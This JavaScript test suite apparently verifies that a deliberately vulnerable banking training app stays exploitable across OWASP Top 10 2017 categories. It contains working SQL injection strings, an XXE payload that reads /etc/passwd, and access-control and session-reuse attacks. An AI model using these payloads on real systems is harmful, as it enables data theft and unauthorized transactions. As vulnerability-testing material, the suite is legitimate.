const runAttacksTests = function(chai, config) {

var { USERNAME, UNAUTHORIZED_USERNAME, UNAUTHORIZED_ACCOUNT_NUMBER, URL, WEAK_PASSWORD_HASH, CONTACTS_URI, 
  CUSTOMERS_URI, TRANSACTIONS_URI, ADMINER_URI, CDN_URI, SESSIONS_URI, validateHealthCheck, 
  logInUser, logOutUser } = config;
var expect = chai.expect;

describe('Attacks', function() {

  before('Validate system healthcheck', function() {
    return validateHealthCheck(chai);
  })

  describe('A1:2017 - SQL Injection', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return logInUser(chai).then(sessionId => currentSessionId = sessionId);
    })
  
    after('Log out customer to release session', function() {
      return logOutUser(chai, currentSessionId);
    })

    it('Should list all customers data using SQL injection', function() {
      return chai.request(URL).get(`${CUSTOMERS_URI}/${USERNAME} or 1=1`)
        .set('sessionid',currentSessionId)
        .then(response => {
          expect(response).to.have.status(200)
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body).to.have.lengthOf(4);
          expect(response.body.map(entry=> {return {id:entry.id}})).to.have.deep.members([{id:2241}, {id:2242}, {id:2243}, {id:2244}]);
        })
    })

    it('Should allow to run multiple queries when SQL injection is used', function() {
      return chai.request(URL).get(`${CUSTOMERS_URI}/${USERNAME};SELECT * FROM accounts;`)
        .set('sessionid',currentSessionId)
        .then(response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body).to.have.lengthOf(2);
          expect(response.body[0]).to.be.an('array');
          expect(response.body[0]).to.have.lengthOf(1);
          expect(response.body[0][0].id).to.be.equal(USERNAME);
          expect(response.body[1]).to.be.an('array');
          expect(response.body[1].map(entry=> {return {id:entry.id}})).to.deep.include.members([{id:86436}, {id:86438}, {id:86440}, {id:86442}]);
        })
    })
  })

  describe('A2:2017 - Broken Authentication', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return logInUser(chai).then(sessionId => currentSessionId = sessionId);
    })
  
    it('Logout should not invalidate session', function() {
      return logOutUser(chai, currentSessionId)
        .then( () => {
          return chai.request(URL).get(`${CUSTOMERS_URI}/${USERNAME}/accounts`)
          .set('sessionid', currentSessionId)
        })
        .then(response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body).to.have.lengthOf(3);
          expect(response.body.map(entry=> {return {id:entry.id, iban:entry.iban}})).to.have.deep.members([{id:86433, iban:'PL12 5234 4143 8746 7665'}, {id:86434, iban:'PL13 5127 6900 0411 5593'}, {id:86435, iban:'PL53 5324 1702 1359 0846'}]);
        })
    })
  })

  describe('A3:2017 - Sensitive Data Exposure', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return logInUser(chai).then(sessionId => currentSessionId = sessionId);
    })
  
    after('Log out customer to release session', function() {
      return logOutUser(chai, currentSessionId);
    })

    it('Application should use weak password hashing', function() {
      return chai.request(URL).get(`${CUSTOMERS_URI}/${USERNAME}`)
        .set('sessionid',currentSessionId)
        .then(response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body).to.have.lengthOf(1);
          expect(response.body[0].password).to.be.equal(WEAK_PASSWORD_HASH);
        })
    })
  })

  describe('A4:2017 - XML External Entities (XXE)', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return logInUser(chai).then(sessionId => currentSessionId = sessionId);
    })
  
    after('Log out customer to release session', function() {
      return logOutUser(chai, currentSessionId);
    })

    it('Should allow XXE to extract /etc/passwd file', function() {
      return chai.request(URL).post(`${CONTACTS_URI}/${USERNAME}/xml`)
        .set('sessionid', currentSessionId)
        .send({contactsXml:'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/passwd" >]><contacts><contact><name>Business Mike</name><iban>&bar;</iban></contact></contacts>'})
        .then(response => {
          expect(response).to.have.status(200);
        })
        .then( () => {
          return chai.request(URL).get(`${CONTACTS_URI}/${USERNAME}`)
            .set('sessionid', currentSessionId);
        })
        .then(response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body[0].iban).to.match(/node:x:1000:1000::\/home\/node:\/bin\/bash/);        
        })
    })
  })

  describe('A5:2017 - Broken Access Control', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return logInUser(chai).then(sessionId => currentSessionId = sessionId);
    })
  
    after('Log out customer to release session', function() {
      return logOutUser(chai, currentSessionId);
    })

    it('Should list all the active sessions', function() {
      return chai.request(URL).get(SESSIONS_URI).set('sessionid','not_empty')
        .then (response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body[0]).not.to.be.null;
          expect(response.body[0].customerId).not.to.be.null;
          expect(response.body[0].sessions).to.be.an('array');
          expect(response.body[0].sessions).not.to.be.null;
        })
    })

    it('Should allow access to customer data when unathorized user is used', function() {
      return chai.request(URL).get(`${CUSTOMERS_URI}/${UNAUTHORIZED_USERNAME}`)
        .set('sessionid',currentSessionId)
        .then(response => {
          expect(response).to.have.status(200);
          expect(response).to.be.json;
          expect(response.body).to.be.an('array');
          expect(response.body).to.have.lengthOf(1);
          expect(response.body[0]).to.not.be.null;
          expect(response.body[0].id).to.be.equal(UNAUTHORIZED_USERNAME);
          expect(response.body[0].name).to.not.be.null;
          expect(response.body[0].nationality).to.not.be.null;
          expect(response.body[0].salt).to.not.be.null;
          expect(response.body[0].password).to.not.be.null;
        })
    })

    it('Should allow to create new transaction to unauthorized account', function() {
      return chai.request(URL).post(TRANSACTIONS_URI)
        .send({account_id:UNAUTHORIZED_ACCOUNT_NUMBER, amount:10.49, description:'Test transaction', target_iban:'PL12 3456 7890'})
        .set('sessionid', currentSessionId)
        .then(response => {
          expect(response).to.have.status(200);
        });
    })
  })

  describe('A6:2017 - Security Misconfiguration', function() {

    it('Should allow access to MySQL Adminer Console', function() {
      return chai.request(URL).get(ADMINER_URI)
        .then(response => {
          expect(response).to.have.status(200);
        })
    })

    it('Should allow to list CDN directory', function() {
      return chai.request(URL).get(`${CDN_URI}/`)
        .then(response => {
          expect(response).to.have.status(200);
        })
    })

    it('Should allow access to access.php file', function() {
      return chai.request(URL).get(`${CDN_URI}/access.php?${new Date().getTime()}`)
        .then(response => {
          expect(response).to.have.status(200);
        })
    })
  })
})
}

module.exports = { runAttacksTests };